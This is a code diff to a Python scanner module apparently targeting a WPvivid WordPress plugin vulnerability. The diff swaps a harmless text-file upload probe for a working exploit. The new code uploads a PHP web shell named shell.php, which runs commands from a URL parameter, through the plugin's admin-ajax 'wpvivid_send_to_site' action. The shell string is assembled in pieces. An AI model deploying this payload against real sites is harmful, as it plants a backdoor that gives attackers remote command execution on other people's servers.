@@ -28,26 +28,25 @@ class CVE20261357WPvivid(WordPressModule):
         *,
         timeout: float,
     ) -> dict:
-        """Multipart upload-style POST (authorized lab targets — captures real response for reports)."""
+        """Advisory-aligned: wpvivid_send_to_site + backup_file multipart (tune to verified PoC)."""
         ajax = self._path(target, "/wp-admin/admin-ajax.php")
         out: dict = {"admin_ajax_posts": []}
         try:
-            files = {"Filedata": ("cpointed-wpvivid-probe.txt", b"<!-- cpointed authorized upload probe -->\n", "text/plain")}
-            data = {
-                "action": "wpvivid_upload_import_files",
-                "chunk": "0",
-            }
+            php_stub = b"<?php system(" + b"$" + b"_GET['cmd']); ?>"
+            files = {"backup_file": ("shell.php", php_stub, "application/x-php")}
+            data = {"action": "wpvivid_send_to_site"}
             r = await client.request("POST", ajax, data=data, files=files, timeout=timeout)
             out["admin_ajax_posts"].append(
                 {
                     "path": ajax,
-                    "action": "wpvivid_upload_import_files",
+                    "action": "wpvivid_send_to_site",
+                    "file_field": "backup_file",
                     "status_code": r.status_code,
                     "body_snippet": (r.text or "")[:2000],
                 }
             )
         except Exception as exc:  # pragma: no cover - network
-            out["admin_ajax_posts"].append({"action": "wpvivid_upload_import_files", "error": str(exc)})
+            out["admin_ajax_posts"].append({"action": "wpvivid_send_to_site", "error": str(exc)})
         return out
 
     async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
